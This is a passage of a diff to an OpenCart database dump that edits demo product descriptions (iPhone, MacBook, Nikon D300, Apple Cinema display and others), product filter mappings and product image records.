 (40, 4, 'iPhone', '&lt;p class=&quot;intro&quot;&gt;\r\n	iPhone is a revolutionary new mobile phone that allows you to make a call by simply tapping a name or number in your address book, a favorites list, or a call log. It also automatically syncs all your contacts from a PC, Mac, or Internet service. And it lets you select and listen to voicemail messages in whatever order you want just like email.&lt;/p&gt;\r\n', 'Первая линейка', 'iPhone', '', ''),
 (28, 4, 'HTC Touch HD', '&lt;p&gt;\r\n	HTC Touch - in High Definition. Watch music videos and streaming content in awe-inspiring high definition clarity for a mobile experience you never thought possible. Seductively sleek, the HTC Touch HD provides the next generation of mobile functionality, all at a simple touch. Fully integrated with Windows Mobile Professional 6.1, ultrafast 3.5G, GPS, 5MP camera, plus lots more - all delivered on a breathtakingly crisp 3.8&quot; WVGA touchscreen - you can take control of your mobile world with the HTC Touch HD.&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;strong&gt;Features&lt;/strong&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Processor Qualcomm® MSM 7201A™ 528 MHz&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Windows Mobile® 6.1 Professional Operating System&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Memory: 512 MB ROM, 288 MB RAM&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Dimensions: 115 mm x 62.8 mm x 12 mm / 146.4 grams&lt;/li&gt;\r\n	&lt;li&gt;\r\n		3.8-inch TFT-LCD flat touch-sensitive screen with 480 x 800 WVGA resolution&lt;/li&gt;\r\n	&lt;li&gt;\r\n		HSDPA/WCDMA: Europe/Asia: 900/2100 MHz; Up to 2 Mbps up-link and 7.2 Mbps down-link speeds&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Quad-band GSM/GPRS/EDGE: Europe/Asia: 850/900/1800/1900 MHz (Band frequency, HSUPA availability, and data speed are operator dependent.)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Device Control via HTC TouchFLO™ 3D &amp;amp; Touch-sensitive front panel buttons&lt;/li&gt;\r\n	&lt;li&gt;\r\n		GPS and A-GPS ready&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Bluetooth® 2.0 with Enhanced Data Rate and A2DP for wireless stereo headsets&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Wi-Fi®: IEEE 802.11 b/g&lt;/li&gt;\r\n	&lt;li&gt;\r\n		HTC ExtUSB™ (11-pin mini-USB 2.0)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		5 megapixel color camera with auto focus&lt;/li&gt;\r\n	&lt;li&gt;\r\n		VGA CMOS color camera&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Built-in 3.5 mm audio jack, microphone, speaker, and FM radio&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Ring tone formats: AAC, AAC+, eAAC+, AMR-NB, AMR-WB, QCP, MP3, WMA, WAV&lt;/li&gt;\r\n	&lt;li&gt;\r\n		40 polyphonic and standard MIDI format 0 and 1 (SMF)/SP MIDI&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Rechargeable Lithium-ion or Lithium-ion polymer 1350 mAh battery&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Expansion Slot: microSD™ memory card (SD 2.0 compatible)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		AC Adapter Voltage range/frequency: 100 ~ 240V AC, 50/60 Hz DC output: 5V and 1A&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Special Features: FM Radio, G-Sensor&lt;/li&gt;\r\n&lt;/ul&gt;\r\n', '', 'HTC Touch HD', '', ''),
 (44, 3, 'MacBook Air', '&lt;div&gt;\r\n	MacBook Air is ultrathin, ultraportable, and ultra unlike anything else. But you don&amp;rsquo;t lose inches and pounds overnight. It&amp;rsquo;s the result of rethinking conventions. Of multiple wireless innovations. And of breakthrough design. With MacBook Air, mobile computing suddenly has a new standard.&lt;/div&gt;\r\n', '', '', '', ''),
@@ -2644,9 +2655,9 @@ INSERT INTO `oc_product_description` (`product_id`, `language_id`, `name`, `desc
 (32, 3, 'iPod Touch', '&lt;p&gt;\r\n	&lt;strong&gt;Revolutionary multi-touch interface.&lt;/strong&gt;&lt;br /&gt;\r\n	iPod touch features the same multi-touch screen technology as iPhone. Pinch to zoom in on a photo. Scroll through your songs and videos with a flick. Flip through your library by album artwork with Cover Flow.&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;strong&gt;Gorgeous 3.5-inch widescreen display.&lt;/strong&gt;&lt;br /&gt;\r\n	Watch your movies, TV shows, and photos come alive with bright, vivid color on the 320-by-480-pixel display.&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;strong&gt;Music downloads straight from iTunes.&lt;/strong&gt;&lt;br /&gt;\r\n	Shop the iTunes Wi-Fi Music Store from anywhere with Wi-Fi.1 Browse or search to find the music youre looking for, preview it, and buy it with just a tap.&lt;/p&gt;\r\n&lt;p&gt;\r\n	&lt;strong&gt;Surf the web with Wi-Fi.&lt;/strong&gt;&lt;br /&gt;\r\n	Browse the web using Safari and watch YouTube videos on the first iPod with Wi-Fi built in&lt;br /&gt;\r\n	&amp;nbsp;&lt;/p&gt;\r\n', '', '', '', ''),
 (41, 3, 'iMac', '&lt;div&gt;\r\n	Just when you thought iMac had everything, now there&acute;s even more. More powerful Intel Core 2 Duo processors. And more memory standard. Combine this with Mac OS X Leopard and iLife &acute;08, and it&acute;s more all-in-one than ever. iMac packs amazing performance into a stunningly slim space.&lt;/div&gt;\r\n', '', '', '', ''),
 (33, 3, 'Samsung SyncMaster 941BW', '&lt;div&gt;\r\n	Imagine the advantages of going big without slowing down. The big 19&amp;quot; 941BW monitor combines wide aspect ratio with fast pixel response time, for bigger images, more room to work and crisp motion. In addition, the exclusive MagicBright 2, MagicColor and MagicTune technologies help deliver the ideal image in every situation, while sleek, narrow bezels and adjustable stands deliver style just the way you want it. With the Samsung 941BW widescreen analog/digital LCD monitor, it&amp;#39;s not hard to imagine.&lt;/div&gt;\r\n', '', '', '', ''),
-(34, 3, 'iPod Shuffle', '&lt;div&gt;\r\n	&lt;strong&gt;Born to be worn.&lt;/strong&gt;\r\n	&lt;p&gt;\r\n		Clip on the worlds most wearable music player and take up to 240 songs with you anywhere. Choose from five colors including four new hues to make your musical fashion statement.&lt;/p&gt;\r\n	&lt;p&gt;\r\n		&lt;strong&gt;Random meets rhythm.&lt;/strong&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		With iTunes autofill, iPod shuffle can deliver a new musical experience every time you sync. For more randomness, you can shuffle songs during playback with the slide of a switch.&lt;/p&gt;\r\n	&lt;strong&gt;Everything is easy.&lt;/strong&gt;\r\n	&lt;p&gt;\r\n		Charge and sync with the included USB dock. Operate the iPod shuffle controls with one hand. Enjoy up to 12 hours straight of skip-free music playback.&lt;/p&gt;\r\n&lt;/div&gt;\r\n', '', '', '', ''),
-(43, 4, 'MacBook', '&lt;div&gt;\r\n	&lt;p&gt;\r\n		&lt;b&gt;Intel Core 2 Duo processor&lt;/b&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		Powered by an Intel Core 2 Duo processor at speeds up to 2.16GHz, the new MacBook is the fastest ever.&lt;/p&gt;\r\n	&lt;p&gt;\r\n		&lt;b&gt;1GB memory, larger hard drives&lt;/b&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		The new MacBook now comes with 1GB of memory standard and larger hard drives for the entire line perfect for running more of your favorite applications and storing growing media collections.&lt;/p&gt;\r\n	&lt;p&gt;\r\n		&lt;b&gt;Sleek, 1.08-inch-thin design&lt;/b&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		MacBook makes it easy to hit the road thanks to its tough polycarbonate case, built-in wireless technologies, and innovative MagSafe Power Adapter that releases automatically if someone accidentally trips on the cord.&lt;/p&gt;\r\n	&lt;p&gt;\r\n		&lt;b&gt;Built-in iSight camera&lt;/b&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		Right out of the box, you can have a video chat with friends or family,2 record a video at your desk, or take fun pictures with Photo Booth&lt;/p&gt;\r\n&lt;/div&gt;\r\n', 'Первая линейка', 'MacBook', '', '');
+(34, 3, 'iPod Shuffle', '&lt;div&gt;\r\n	&lt;strong&gt;Born to be worn.&lt;/strong&gt;\r\n	&lt;p&gt;\r\n		Clip on the worlds most wearable music player and take up to 240 songs with you anywhere. Choose from five colors including four new hues to make your musical fashion statement.&lt;/p&gt;\r\n	&lt;p&gt;\r\n		&lt;strong&gt;Random meets rhythm.&lt;/strong&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		With iTunes autofill, iPod shuffle can deliver a new musical experience every time you sync. For more randomness, you can shuffle songs during playback with the slide of a switch.&lt;/p&gt;\r\n	&lt;strong&gt;Everything is easy.&lt;/strong&gt;\r\n	&lt;p&gt;\r\n		Charge and sync with the included USB dock. Operate the iPod shuffle controls with one hand. Enjoy up to 12 hours straight of skip-free music playback.&lt;/p&gt;\r\n&lt;/div&gt;\r\n', '', '', '', '');
 INSERT INTO `oc_product_description` (`product_id`, `language_id`, `name`, `description`, `tag`, `meta_title`, `meta_description`, `meta_keyword`) VALUES
+(43, 4, 'MacBook', '&lt;div&gt;\r\n	&lt;p&gt;\r\n		&lt;b&gt;Intel Core 2 Duo processor&lt;/b&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		Powered by an Intel Core 2 Duo processor at speeds up to 2.16GHz, the new MacBook is the fastest ever.&lt;/p&gt;\r\n	&lt;p&gt;\r\n		&lt;b&gt;1GB memory, larger hard drives&lt;/b&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		The new MacBook now comes with 1GB of memory standard and larger hard drives for the entire line perfect for running more of your favorite applications and storing growing media collections.&lt;/p&gt;\r\n	&lt;p&gt;\r\n		&lt;b&gt;Sleek, 1.08-inch-thin design&lt;/b&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		MacBook makes it easy to hit the road thanks to its tough polycarbonate case, built-in wireless technologies, and innovative MagSafe Power Adapter that releases automatically if someone accidentally trips on the cord.&lt;/p&gt;\r\n	&lt;p&gt;\r\n		&lt;b&gt;Built-in iSight camera&lt;/b&gt;&lt;/p&gt;\r\n	&lt;p&gt;\r\n		Right out of the box, you can have a video chat with friends or family,2 record a video at your desk, or take fun pictures with Photo Booth&lt;/p&gt;\r\n&lt;/div&gt;\r\n', 'Первая линейка', 'MacBook', '', ''),
 (31, 3, 'Nikon D300', '&lt;div class=&quot;cpt_product_description &quot;&gt;\r\n	&lt;div&gt;\r\n		Engineered with pro-level features and performance, the 12.3-effective-megapixel D300 combines brand new technologies with advanced features inherited from Nikon&amp;#39;s newly announced D3 professional digital SLR camera to offer serious photographers remarkable performance combined with agility.&lt;br /&gt;\r\n		&lt;br /&gt;\r\n		Similar to the D3, the D300 features Nikon&amp;#39;s exclusive EXPEED Image Processing System that is central to driving the speed and processing power needed for many of the camera&amp;#39;s new features. The D300 features a new 51-point autofocus system with Nikon&amp;#39;s 3D Focus Tracking feature and two new LiveView shooting modes that allow users to frame a photograph using the camera&amp;#39;s high-resolution LCD monitor. The D300 shares a similar Scene Recognition System as is found in the D3; it promises to greatly enhance the accuracy of autofocus, autoexposure, and auto white balance by recognizing the subject or scene being photographed and applying this information to the calculations for the three functions.&lt;br /&gt;\r\n		&lt;br /&gt;\r\n		The D300 reacts with lightning speed, powering up in a mere 0.13 seconds and shooting with an imperceptible 45-millisecond shutter release lag time. The D300 is capable of shooting at a rapid six frames per second and can go as fast as eight frames per second when using the optional MB-D10 multi-power battery pack. In continuous bursts, the D300 can shoot up to 100 shots at full 12.3-megapixel resolution. (NORMAL-LARGE image setting, using a SanDisk Extreme IV 1GB CompactFlash card.)&lt;br /&gt;\r\n		&lt;br /&gt;\r\n		The D300 incorporates a range of innovative technologies and features that will significantly improve the accuracy, control, and performance photographers can get from their equipment. Its new Scene Recognition System advances the use of Nikon&amp;#39;s acclaimed 1,005-segment sensor to recognize colors and light patterns that help the camera determine the subject and the type of scene being photographed before a picture is taken. This information is used to improve the accuracy of autofocus, autoexposure, and auto white balance functions in the D300. For example, the camera can track moving subjects better and by identifying them, it can also automatically select focus points faster and with greater accuracy. It can also analyze highlights and more accurately determine exposure, as well as infer light sources to deliver more accurate white balance detection.&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;!-- cpt_container_end --&gt;', '', '', '', ''),
 (49, 3, 'Samsung Galaxy Tab 10.1', '&lt;p&gt;\r\n	Samsung Galaxy Tab 10.1, is the world&amp;rsquo;s thinnest tablet, measuring 8.6 mm thickness, running with Android 3.0 Honeycomb OS on a 1GHz dual-core Tegra 2 processor, similar to its younger brother Samsung Galaxy Tab 8.9.&lt;/p&gt;\r\n&lt;p&gt;\r\n	Samsung Galaxy Tab 10.1 gives pure Android 3.0 experience, adding its new TouchWiz UX or TouchWiz 4.0 &amp;ndash; includes a live panel, which lets you to customize with different content, such as your pictures, bookmarks, and social feeds, sporting a 10.1 inches WXGA capacitive touch screen with 1280 x 800 pixels of resolution, equipped with 3 megapixel rear camera with LED flash and a 2 megapixel front camera, HSPA+ connectivity up to 21Mbps, 720p HD video recording capability, 1080p HD playback, DLNA support, Bluetooth 2.1, USB 2.0, gyroscope, Wi-Fi 802.11 a/b/g/n, micro-SD slot, 3.5mm headphone jack, and SIM slot, including the Samsung Stick &amp;ndash; a Bluetooth microphone that can be carried in a pocket like a pen and sound dock with powered subwoofer.&lt;/p&gt;\r\n&lt;p&gt;\r\n	Samsung Galaxy Tab 10.1 will come in 16GB / 32GB / 64GB verities and pre-loaded with Social Hub, Reader&amp;rsquo;s Hub, Music Hub and Samsung Mini Apps Tray &amp;ndash; which gives you access to more commonly used apps to help ease multitasking and it is capable of Adobe Flash Player 10.2, powered by 6860mAh battery that gives you 10hours of video-playback time.&amp;nbsp;&amp;auml;&amp;ouml;&lt;/p&gt;\r\n', '', '', '', ''),
 (42, 4, 'Apple Cinema 30&quot;', '&lt;p&gt;\r\n	&lt;font face=&quot;helvetica,geneva,arial&quot; size=&quot;2&quot;&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The 30-inch Apple Cinema HD Display delivers an amazing 2560 x 1600 pixel resolution. Designed specifically for the creative professional, this display provides more space for easier access to all the tools and palettes needed to edit, format and composite your work. Combine this display with a Mac Pro, MacBook Pro, or PowerMac G5 and there''s no limit to what you can achieve. &lt;br&gt;\r\n	&lt;br&gt;\r\n	&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features an active-matrix liquid crystal display that produces flicker-free images that deliver twice the brightness, twice the sharpness and twice the contrast ratio of a typical CRT display. Unlike other flat panels, it''s designed with a pure digital interface to deliver distortion-free images that never need adjusting. With over 4 million digital pixels, the display is uniquely suited for scientific and technical applications such as visualizing molecular structures or analyzing geological data. &lt;br&gt;\r\n	&lt;br&gt;\r\n	&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Offering accurate, brilliant color performance, the Cinema HD delivers up to 16.7 million colors across a wide gamut allowing you to see subtle nuances between colors from soft pastels to rich jewel tones. A wide viewing angle ensures uniform color from edge to edge. Apple''s ColorSync technology allows you to create custom profiles to maintain consistent color onscreen and in print. The result: You can confidently use this display in all your color-critical applications. &lt;br&gt;\r\n	&lt;br&gt;\r\n	&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Housed in a new aluminum design, the display has a very thin bezel that enhances visual accuracy. Each display features two FireWire 400 ports and two USB 2.0 ports, making attachment of desktop peripherals, such as iSight, iPod, digital and still cameras, hard drives, printers and scanners, even more accessible and convenient. Taking advantage of the much thinner and lighter footprint of an LCD, the new displays support the VESA (Video Electronics Standards Association) mounting interface standard. Customers with the optional Cinema Display VESA Mount Adapter kit gain the flexibility to mount their display in locations most appropriate for their work environment. &lt;br&gt;\r\n	&lt;br&gt;\r\n	&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features a single cable design with elegant breakout for the USB 2.0, FireWire 400 and a pure digital connection using the industry standard Digital Video Interface (DVI) interface. The DVI connection allows for a direct pure-digital connection.&lt;br&gt;\r\n	&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;\r\n	Features:&lt;/h3&gt;\r\n&lt;p&gt;\r\n	Unrivaled display performance&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		30-inch (viewable) active-matrix liquid crystal display provides breathtaking image quality and vivid, richly saturated color.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Support for 2560-by-1600 pixel resolution for display of high definition still and video imagery.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Wide-format design for simultaneous display of two full pages of text and graphics.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Industry standard DVI connector for direct attachment to Mac- and Windows-based desktops and notebooks&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Incredibly wide (170 degree) horizontal and vertical viewing angle for maximum visibility and color performance.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Lightning-fast pixel response for full-motion digital video playback.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Support for 16.7 million saturated colors, for use in all graphics-intensive applications.&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	Simple setup and operation&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Single cable with elegant breakout for connection to DVI, USB and FireWire ports&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Built-in two-port USB 2.0 hub for easy connection of desktop peripheral devices.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Two FireWire 400 ports to support iSight and other desktop peripherals&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	Sleek, elegant design&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Huge virtual workspace, very small footprint.&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Narrow Bezel design to minimize visual impact of using dual displays&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Unique hinge design for effortless adjustment&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Support for VESA mounting solutions (Apple Cinema Display VESA Mount Adapter sold separately)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h3&gt;\r\n	Technical specifications&lt;/h3&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Screen size (diagonal viewable image size)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Apple Cinema HD Display: 30 inches (29.7-inch viewable)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Screen type&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Thin film transistor (TFT) active-matrix liquid crystal display (AMLCD)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Resolutions&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		2560 x 1600 pixels (optimum resolution)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		2048 x 1280&lt;/li&gt;\r\n	&lt;li&gt;\r\n		1920 x 1200&lt;/li&gt;\r\n	&lt;li&gt;\r\n		1280 x 800&lt;/li&gt;\r\n	&lt;li&gt;\r\n		1024 x 640&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Display colors (maximum)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		16.7 million&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Viewing angle (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		170° horizontal; 170° vertical&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Brightness (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		30-inch Cinema HD Display: 400 cd/m2&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Contrast ratio (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		700:1&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Response time (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		16 ms&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Pixel pitch&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		30-inch Cinema HD Display: 0.250 mm&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Screen treatment&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Antiglare hardcoat&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;User controls (hardware and software)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Display Power,&lt;/li&gt;\r\n	&lt;li&gt;\r\n		System sleep, wake&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Brightness&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Monitor tilt&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Connectors and cables&lt;/b&gt;&lt;br&gt;\r\n	Cable&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		DVI (Digital Visual Interface)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		FireWire 400&lt;/li&gt;\r\n	&lt;li&gt;\r\n		USB 2.0&lt;/li&gt;\r\n	&lt;li&gt;\r\n		DC power (24 V)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	Connectors&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Two-port, self-powered USB 2.0 hub&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Two FireWire 400 ports&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Kensington security port&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;VESA mount adapter&lt;/b&gt;&lt;br&gt;\r\n	Requires optional Cinema Display VESA Mount Adapter (M9649G/A)&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Compatible with VESA FDMI (MIS-D, 100, C) compliant mounting solutions&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Electrical requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Input voltage: 100-240 VAC 50-60Hz&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Maximum power when operating: 150W&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Energy saver mode: 3W or less&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Environmental requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Operating temperature: 50° to 95° F (10° to 35° C)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Storage temperature: -40° to 116° F (-40° to 47° C)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Operating humidity: 20% to 80% noncondensing&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Maximum operating altitude: 10,000 feet&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Agency approvals&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		FCC Part 15 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		EN55022 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		EN55024&lt;/li&gt;\r\n	&lt;li&gt;\r\n		VCCI Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		AS/NZS 3548 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		CNS 13438 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		ICES-003 Class B&lt;/li&gt;\r\n	&lt;li&gt;\r\n		ISO 13406 part 2&lt;/li&gt;\r\n	&lt;li&gt;\r\n		MPR II&lt;/li&gt;\r\n	&lt;li&gt;\r\n		IEC 60950&lt;/li&gt;\r\n	&lt;li&gt;\r\n		UL 60950&lt;/li&gt;\r\n	&lt;li&gt;\r\n		CSA 60950&lt;/li&gt;\r\n	&lt;li&gt;\r\n		EN60950&lt;/li&gt;\r\n	&lt;li&gt;\r\n		ENERGY STAR&lt;/li&gt;\r\n	&lt;li&gt;\r\n		TCO ''03&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;Size and weight&lt;/b&gt;&lt;br&gt;\r\n	30-inch Apple Cinema HD Display&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Height: 21.3 inches (54.3 cm)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Width: 27.2 inches (68.8 cm)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Depth: 8.46 inches (21.5 cm)&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Weight: 27.5 pounds (12.5 kg)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n	&lt;b&gt;System Requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n	&lt;li&gt;\r\n		Mac Pro, all graphic options&lt;/li&gt;\r\n	&lt;li&gt;\r\n		MacBook Pro&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Power Mac G5 (PCI-X) with ATI Radeon 9650 or better or NVIDIA GeForce 6800 GT DDL or better&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Power Mac G5 (PCI Express), all graphics options&lt;/li&gt;\r\n	&lt;li&gt;\r\n		PowerBook G4 with dual-link DVI support&lt;/li&gt;\r\n	&lt;li&gt;\r\n		Windows PC and graphics card that supports DVI ports with dual-link digital bandwidth and VESA DDC standard for plug-and-play setup&lt;/li&gt;\r\n&lt;/ul&gt;\r\n', '', 'Apple Cinema 30&quot;', '', ''),
@@ -2702,9 +2713,11 @@ CREATE TABLE IF NOT EXISTS `oc_product_filter` (
 --
 
 INSERT INTO `oc_product_filter` (`product_id`, `filter_id`) VALUES
+(40, 2),
 (42, 1),
 (42, 6),
-(43, 2);
+(43, 2),
+(47, 3);
 
 -- --------------------------------------------------------
 
@@ -2719,7 +2732,7 @@ CREATE TABLE IF NOT EXISTS `oc_product_image` (
   `sort_order` int(3) NOT NULL DEFAULT '0',
   PRIMARY KEY (`product_image_id`),
   KEY `product_id` (`product_id`)
-) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2687 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2704 ;
 
 --
 -- Дамп данных таблицы `oc_product_image`
@@ -2727,10 +2740,10 @@ CREATE TABLE IF NOT EXISTS `oc_product_image` (
 
 INSERT INTO `oc_product_image` (`product_image_id`, `product_id`, `image`, `sort_order`) VALUES
 (2638, 30, 'catalog/demo/canon_eos_5d_3.jpg', 0),
-(2677, 47, 'catalog/demo/hp_2.jpg', 0),
+(2695, 47, 'catalog/demo/hp_2.jpg', 0),
 (2353, 28, 'catalog/demo/htc_touch_hd_3.jpg', 0),
 (2351, 41, 'catalog/demo/imac_3.jpg', 0),
-(2682, 40, 'catalog/demo/iphone_6.jpg', 0),
+(2700, 40, 'catalog/demo/iphone_6.jpg', 0),
 (2001, 36, 'catalog/demo/ipod_nano_5.jpg', 0),
 (2000, 36, 'catalog/demo/ipod_nano_4.jpg', 0),
 (2005, 34, 'catalog/demo/ipod_shuffle_5.jpg', 0),
@@ -2749,17 +2762,17 @@ INSERT INTO `oc_product_image` (`product_image_id`, `product_id`, `image`, `sort
 (1988, 29, 'catalog/demo/palm_treo_pro_3.jpg', 0),
 (1995, 46, 'catalog/demo/sony_vaio_5.jpg', 0),
 (1994, 46, 'catalog/demo/sony_vaio_4.jpg', 0),
-(1991, 48, 'catalog/demo/ipod_classic_4.jpg', 0),
-(1990, 48, 'catalog/demo/ipod_classic_3.jpg', 0),
-(2681, 40, 'catalog/demo/iphone_2.jpg', 0),
-(2680, 40, 'catalog/demo/iphone_5.jpg', 0),
+(2703, 48, 'catalog/demo/ipod_classic_2.jpg', 0),
+(2702, 48, 'catalog/demo/ipod_classic_3.jpg', 0),
+(2699, 40, 'catalog/demo/iphone_2.jpg', 0),
+(2698, 40, 'catalog/demo/iphone_5.jpg', 0),
 (2637, 30, 'catalog/demo/canon_eos_5d_2.jpg', 0),
-(2676, 47, 'catalog/demo/hp_3.jpg', 0),
+(2694, 47, 'catalog/demo/hp_3.jpg', 0),
 (2352, 28, 'catalog/demo/htc_touch_hd_2.jpg', 0),
 (2350, 41, 'catalog/demo/imac_2.jpg', 0),
-(2679, 40, 'catalog/demo/iphone_3.jpg', 0),
-(2678, 40, 'catalog/demo/iphone_4.jpg', 0),
-(1989, 48, 'catalog/demo/ipod_classic_2.jpg', 0),
+(2697, 40, 'catalog/demo/iphone_3.jpg', 0),
+(2696, 40, 'catalog/demo/iphone_4.jpg', 0),
+(2701, 48, 'catalog/demo/ipod_classic_4.jpg', 0),
